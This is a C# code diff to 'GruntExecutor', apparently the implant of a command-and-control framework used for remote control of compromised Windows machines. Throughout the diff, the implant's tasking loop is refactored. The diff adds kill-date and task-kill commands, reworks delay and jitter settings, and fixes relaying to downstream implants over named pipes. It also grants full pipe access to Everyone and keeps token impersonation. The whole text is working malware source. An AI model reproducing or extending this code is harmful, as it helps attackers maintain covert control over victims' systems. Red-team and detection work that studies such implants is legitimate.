@@ -9,6 +9,7 @@ using System.Threading;
 using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Principal;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Text.RegularExpressions;
 
@@ -75,7 +76,7 @@ namespace GruntExecutor
                 }
                 catch (Exception) {}
 
-                List<KeyValuePair<string, Thread>> Jobs = new List<KeyValuePair<string, Thread>>();
+                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                 WindowsImpersonationContext impersonationContext = null;
                 Random rnd = new Random();
                 int ConnectAttemptCount = 0;
@@ -92,32 +93,43 @@ namespace GruntExecutor
                         {
                             ConnectAttemptCount = 0;
                             string output = "";
-                            if (message.Type == GruntTaskingType.SetOption)
+                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                             {
-								string[] split = message.Message.Split(',');
-								if (split.Length >= 2 && int.TryParse(split[1], out int val))
-								{
-									if (split[0].Equals("Delay", StringComparison.CurrentCultureIgnoreCase))
-									{
-										Delay = val;
-										output += "Set Delay: " + Delay;
-									}
-									else if (split[0].Equals("JitterPercent", StringComparison.CurrentCultureIgnoreCase))
-									{
-										Jitter = val;
-										output += "Set JitterPercent: " + Jitter;
-									}
-									else if (split[0].Equals("ConnectAttempts", StringComparison.CurrentCultureIgnoreCase))
-									{
-										ConnectAttempts = val;
-										output += "Set ConnectAttempts: " + ConnectAttempts;
-									}
-								}
-								else
-								{
-									output += "Error parsing SetOption: " + message.Message;
-								}
-								messenger.WriteTaskingMessage(output, message.Name);
+                                if (int.TryParse(message.Message, out int val))
+                                {
+                                    if (message.Type == GruntTaskingType.SetDelay)
+                                    {
+                                        Delay = val;
+                                        output += "Set Delay: " + Delay;
+                                    }
+                                    else if (message.Type == GruntTaskingType.SetJitter)
+                                    {
+                                        Jitter = val;
+                                        output += "Set Jitter: " + Jitter;
+                                    }
+                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
+                                    {
+                                        ConnectAttempts = val;
+                                        output += "Set ConnectAttempts: " + ConnectAttempts;
+                                    }
+                                }
+                                else
+                                {
+                                    output += "Error parsing: " + message.Message;
+                                }
+                                messenger.WriteTaskingMessage(output, message.Name);
+                            }
+                            else if (message.Type == GruntTaskingType.SetKillDate)
+                            {
+                                if (DateTime.TryParse(message.Message, out DateTime date))
+                                {
+                                    KillDate = date;
+                                    output += "Set KillDate: " + KillDate.ToString();
+                                }
+                                else
+                                {
+                                    output += "Error parsing: " + message.Message;
+                                }
                             }
                             else if (message.Type == GruntTaskingType.Exit)
                             {
@@ -125,14 +137,29 @@ namespace GruntExecutor
                                 messenger.WriteTaskingMessage(output, message.Name);
                                 return;
                             }
-                            else if(message.Type == GruntTaskingType.Jobs)
+                            else if(message.Type == GruntTaskingType.Tasks)
                             {
-                                if (!Jobs.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
+                                if (!Tasks.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                 else
                                 {
                                     output += "Task       Status" + Environment.NewLine;
                                     output += "----       ------" + Environment.NewLine;
-                                    output += String.Join(Environment.NewLine, Jobs.Where(J => J.Value.IsAlive).Select(J => J.Key + " Active").ToArray());
+                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
+                                }
+                                messenger.WriteTaskingMessage(output, message.Name);
+                            }
+                            else if(message.Type == GruntTaskingType.TaskKill)
+                            {
+                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
+                                if (!matched.Any())
+                                {
+                                    output += "No task with name: " + message.Message;
+                                }
+                                else
+                                {
+                                    KeyValuePair<string, Thread> t = matched.First();
+                                    t.Value.Abort();
+                                    output += "Task: " + t.Key + " killed!";
                                 }
                                 messenger.WriteTaskingMessage(output, message.Name);
                             }
@@ -162,7 +189,7 @@ namespace GruntExecutor
                             {
                                 Thread t = new Thread(() => TaskExecute(messenger, message));
                                 t.Start();
-                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
                         }
                     }
@@ -305,7 +332,6 @@ namespace GruntExecutor
 
         public GruntTaskingMessage ReadTaskingMessage()
         {
-            // TODO: why does this need to be PostResponse?
             string read = "";
             lock (_UpstreamLock)
             {
@@ -332,8 +358,7 @@ namespace GruntExecutor
                 IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                 if (relay != null)
                 {
-                    // TODO: why does this need to be PostResponse?
-                    relay.Write(this.Profile.FormatWriteFormat(wrappedMessage));
+                    relay.Write(this.Profile.FormatReadFormat(wrappedMessage));
                 }
                 return null;
             }
@@ -440,7 +465,7 @@ namespace GruntExecutor
                     try
                     {
                         PipeSecurity ps = new PipeSecurity();
-                        ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                         NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                         newServerPipe.WaitForConnection();
                         lock (this._WritePipeLock)
@@ -584,11 +609,15 @@ namespace GruntExecutor
     public enum GruntTaskingType
     {
         Assembly,
-        SetOption,
+        SetDelay,
+        SetJitter,
+        SetConnectAttempts,
+        SetKillDate,
         Exit,
         Connect,
         Disconnect,
-        Jobs
+        Tasks,
+        TaskKill
     }
 
     public class GruntTaskingMessage
